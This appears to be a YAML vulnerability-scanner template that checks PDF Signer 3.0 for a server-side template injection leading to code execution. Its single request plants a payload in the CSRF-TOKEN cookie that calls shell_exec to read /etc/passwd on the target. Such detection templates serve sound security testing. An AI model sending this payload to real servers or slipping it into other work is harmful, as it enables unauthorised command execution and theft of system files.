id: pdf-signer-ssti-to-rce
brief:
    title: PDF Signer 3.0 - Template Injection
    by: madrobot
    level: critical
    about: PDF Signer 3.0 is susceptible to a template injection which allows code execution, due to improper cookie handling and an improper CSRF implementation. An attacker can execute code on the server in...
    label:
        - ssti
        - rce
        - csrf
        - vuln
    score: CVSS:9.8
moves:
    - verb: GET
      to:
        - '{{BaseURL}}'
      head:
        Cookie: CSRF-TOKEN=rnqvt{{shell_exec('cat /etc/passwd')}}to5gw; simcify=uv82sg0jj2oqa0kkr2virls4dl
      signs:
        - "on": status
          status:
            - 200
